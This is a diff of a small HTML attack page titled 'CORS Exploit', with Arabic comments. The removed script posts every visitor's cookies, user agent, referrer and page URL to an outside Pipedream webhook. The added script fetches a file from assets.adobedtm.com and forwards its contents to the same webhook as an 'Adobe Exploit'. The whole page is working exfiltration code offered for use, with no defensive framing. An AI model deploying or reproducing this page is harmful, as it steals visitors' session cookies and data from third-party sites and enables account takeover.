@@ -3,29 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit Page</title>
+    <title>CORS Exploit</title>
 </head>
 <body>
+    <h1>Exploit Running...</h1>
+    
     <script>
-        // استبدل هذا الرابط بالرابط الذي حصلت عليه من Pipedream
-        const targetUrl = "https://eoajz7c5v00ct8t.m.pipedream.net"; // رابط Pipedream
+        // استبدل الرابط برابط Pipedream الخاص بك
+        const webhook = "https://eoajz7c5v00ct8t.m.pipedream.net";
 
-        // إرسال البيانات إلى الرابط
-        fetch(targetUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                url: window.location.href,
-                cookies: document.cookie
-            })
+        // استغلال CORS لجلب البيانات من assets.adobedtm.com
+        fetch("https://assets.adobedtm.com/crossdomain.xml")
+        .then(response => response.text())
+        .then(data => {
+            console.log("Data received from Adobe:", data);
+
+            // إرسال البيانات إلى Pipedream
+            fetch(webhook, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    source: "Adobe Exploit",
+                    content: data
+                })
+            });
         })
-        .then(response => response.json())
-        .then(data => console.log("Data sent successfully", data))
-        .catch(error => console.error("Error:", error));
+        .catch(error => console.error("Exploit failed:", error));
     </script>
+
 </body>
 </html>
